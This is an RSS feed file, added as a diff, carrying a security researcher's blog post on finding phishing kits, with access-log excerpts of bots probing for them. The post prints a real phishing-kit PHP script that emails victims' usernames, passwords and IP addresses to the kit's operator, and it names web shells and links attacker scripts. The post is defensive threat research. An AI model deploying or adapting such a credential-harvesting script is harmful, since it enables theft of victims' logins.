@@ -1,0 +1,123 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Phishing Kits on Jordan Wright</title>
+    <link>http://jordan-wright.com/blog/tags/phishing-kits/</link>
+    <description>Recent content in Phishing Kits on Jordan Wright</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 29 Jul 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://jordan-wright.com/blog/tags/phishing-kits/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>How to Hunt Down Phishing Kits</title>
+      <link>http://jordan-wright.com/blog/2014/07/30/how-to-hunt-down-phishing-kits/</link>
+      <pubDate>Tue, 29 Jul 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2014/07/30/how-to-hunt-down-phishing-kits/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/phishing_kit.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:097ea0cb3fa9b5149cf80e9dc524b44e&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Sites like &lt;a href=&#34;http://www.phishtank.com/phish_archive.php&#34;&gt;phishtank&lt;/a&gt; and &lt;a href=&#34;http://support.clean-mx.com/clean-mx/phishing.php&#34;&gt;clean-mx&lt;/a&gt; act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently find &lt;a href=&#34;http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/&#34;&gt;interesting information&lt;/a&gt; about how attackers work, and the tools they use to conduct phishing campaigns. This post will give an example of how &lt;em&gt;phishing kits&lt;/em&gt; are used, how to find them, as well as show a case study into other tools attackers use to maintain access to compromised servers.&lt;/p&gt;
+
+&lt;h3 id=&#34;how-phishing-kits-work:097ea0cb3fa9b5149cf80e9dc524b44e&#34;&gt;How Phishing Kits Work&lt;/h3&gt;
+
+&lt;p&gt;To perform a phishing attack, attackers commonly employ prebuilt &lt;em&gt;phishing kits&lt;/em&gt;. These kits come as a zip archive containing the HTML source code of the site they are spoofing, as well as accompanying PHP scripts that capture and process the phished credentials. Once credentials are submitted from a victim, they are passed to a script that looks similar to this (real) example:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+if(!isset($_SESSION[&#39;username&#39;]) || $_SESSION[&#39;username&#39;] == &amp;quot;&amp;quot; || !isset($_SESSION[&#39;password&#39;]) || $_SESSION[&#39;password&#39;] == &amp;quot;&amp;quot;){
+        header(&amp;quot;Location:file_doc.php&amp;quot;);
+        exit;
+}
+session_destroy();
+$username = $_SESSION[&#39;username&#39;];
+$password = $_SESSION[&#39;password&#39;];
+
+$ip = getenv(&amp;quot;REMOTE_ADDR&amp;quot;);
+$country = visitor_country();
+$message .= &amp;quot;-------Moded by Ghost Wir3 ----------\n&amp;quot;;
+$message .= &amp;quot;Username: &amp;quot;.$username.&amp;quot;\n&amp;quot;;
+$message .= &amp;quot;Password : &amp;quot;.$password.&amp;quot;\n&amp;quot;;
+$message .= &amp;quot;IP: &amp;quot;.$ip.&amp;quot;\n&amp;quot;;
+$message .= &amp;quot;Country: &amp;quot;.$country.&amp;quot;\n&amp;quot;;
+$recipient = &amp;quot;[redacted]@gmail.com&amp;quot;;
+$subject = &amp;quot;Ghost Wir3 - &amp;quot;.$country;
+$headers = &amp;quot;From:  Ghost Wir3 &amp;lt;no_reply@mail.com&amp;gt;&amp;quot;;
+$headers .= $_POST[&#39;eMailAdd&#39;].&amp;quot;\n&amp;quot;;
+$headers .= &amp;quot;MIME-Version: 1.0\n&amp;quot;;
+
+$arr = country_sort();
+foreach ($arr as $recipient)
+{
+        mail($recipient,$subject,$message,$headers);
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In this example, to reuse the phishing kit, an attacker simply needs to change the &lt;code&gt;$recipient&lt;/code&gt; variable to point to their address. In addition to this, if we as defenders are able to pull this PHP code, we can quickly identify the threat actor (in this case, [redacted]@gmail.com).&lt;/p&gt;
+
+&lt;h3 id=&#34;how-to-find-phishing-kits:097ea0cb3fa9b5149cf80e9dc524b44e&#34;&gt;How to Find Phishing Kits&lt;/h3&gt;
+
+&lt;p&gt;We&amp;rsquo;ve seen that these kits generally require the credentials to be processed by server-side code. Unless there is a misconfiguration on the server, we will not be able to view this code, only that credentials are being passed to it.&lt;/p&gt;
+
+&lt;p&gt;However, with that being said, *many attackers are &lt;strong&gt;lazy&lt;/strong&gt;*. I&amp;rsquo;ve seen from experience that the original zip file containing the phishing kit is often left on the server, and can be downloaded to reveal the server-side source code. Additionally, the directories hosting the phishing kits often have indexing enabled, making it easier for us to see the files in the directory. This same technique has also &lt;a href=&#34;https://www.usenix.org/legacy/events/woot08/tech/full_papers/cova/cova.pdf&#34;&gt;been used previously by researchers&lt;/a&gt; with success.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/phish_kits/directory_index.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;Knowing this, we can send requests for common archive extensions automatically in the hopes of finding the original phishing kits. These extensions include things such as .zip, .tar, .tar.gz, and .rar. For example, if the URL found by phishtank or clean-mx is &lt;a href=&#34;http://x.x.x.x/apple/index.php&#34;&gt;http://x.x.x.x/apple/index.php&lt;/a&gt;, we could send requests for &lt;a href=&#34;http://x.x.x.x/apple.zip&#34;&gt;http://x.x.x.x/apple.zip&lt;/a&gt; with success in many cases.&lt;/p&gt;
+
+&lt;p&gt;In some cases, finding the original phishing kit can reveal even more information about the tools and techniques used by attackers. Here&amp;rsquo;s an example of one of those cases.&lt;/p&gt;
+
+&lt;h3 id=&#34;a-look-into-a-compromised-website:097ea0cb3fa9b5149cf80e9dc524b44e&#34;&gt;A Look into a Compromised Website&lt;/h3&gt;
+
+&lt;p&gt;While performing random checks on many of the sites listed on phishtank and clean-mx, I came across one site that had a phishing kit located in the /phpmyadmin directory. When checking the files in the phishing kit, I found reference to a c100.php web shell. Sure enough, this file was still in place on the server:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/phish_kits/c100.png&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;PHP backdoors provide substantial access to attackers, facilitating further attacks and control over the compromised server. The c100.php and c99.php backdoors are among the most popular backdoors used by attackers. Through some Googling, we can see that there are &lt;strong&gt;tons&lt;/strong&gt; of servers that are compromised using &lt;a href=&#34;https://www.google.com/search?q=inurl%3A%22c99.php%22%22AND+filetype%3Aphp+%22!C99Shell%22+AND+%22Software%22&#34;&gt;these&lt;/a&gt; &lt;a href=&#34;https://www.google.com/search?q=inurl%3A%22c100.php%22%22AND+filetype%3Aphp+%22%21C100%22+AND+%22Software%22&#34;&gt;shells&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;This shell revealed additional scripts (and other webshells) used by the attacker, including (but certainly not limited to!) the following:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-valider-php&#34;&gt;valider.php&lt;/a&gt; - The credential caching script&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wpbrute-php&#34;&gt;wpbrute.php&lt;/a&gt; - A Wordpress brute forcing script&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wso-php&#34;&gt;wso.php&lt;/a&gt; - Another web shell&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;fellow-phish-hunters:097ea0cb3fa9b5149cf80e9dc524b44e&#34;&gt;Fellow Phish Hunters&lt;/h3&gt;
+
+&lt;p&gt;In the process of pulling down additional scripts used by the attacker, I ran across the site access logs. Looking through this log, I could see the details of what files the attacker was accessing on the server, as well as determine that these files were in place as early as July 27, 2014. In addition to this, I found the following snippet:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[29/Jul/2014:02:59:44 +0100] &amp;quot;GET /phpmyadmin/tardis.zip HTTP/1.1&amp;quot; 404 428 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:44 +0100] &amp;quot;GET /phpmyadmin/paypal/tardis.zip HTTP/1.1&amp;quot; 404 435 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/paypal.zip HTTP/1.1&amp;quot; 404 435 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1&amp;quot; 404 439 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/chase.zip HTTP/1.1&amp;quot; 404 434 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/boa.zip HTTP/1.1&amp;quot; 404 432 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/update.zip HTTP/1.1&amp;quot; 404 435 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/pp.zip HTTP/1.1&amp;quot; 404 431 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/wells.zip HTTP/1.1&amp;quot; 404 434 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:45 +0100] &amp;quot;GET /phpmyadmin/paypal/remax.zip HTTP/1.1&amp;quot; 404 434 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:46 +0100] &amp;quot;GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1&amp;quot; 404 439 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:46 +0100] &amp;quot;GET /phpmyadmin/paypal/us.zip HTTP/1.1&amp;quot; 404 431 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:47 +0100] &amp;quot;GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1&amp;quot; 404 443 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+[29/Jul/2014:02:59:47 +0100] &amp;quot;GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1&amp;quot; 404 446 &amp;quot;-&amp;quot; &amp;quot;Java/1.7.0_45&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can see that someone has a Java bot that is performing the same technique I described above, by automatically sending requests for common phishing kits. In fact, this and another bot submitted a &lt;strong&gt;substantial&lt;/strong&gt; number of requests for common files to be found on phishing kits. I&amp;rsquo;ll likely parse these out and make another blog post with the full list for those interested.&lt;/p&gt;
+
+&lt;h3 id=&#34;conclusion:097ea0cb3fa9b5149cf80e9dc524b44e&#34;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;Hopefully this post not only shows a few of the interesting pieces of information we can find when investigating servers used for phishing campaigns, but also that there is still an incredible amount of work to be done in identifying threat actors behind phishing campaigns. As always, let me know if you have any questions or comments below!&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;http://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
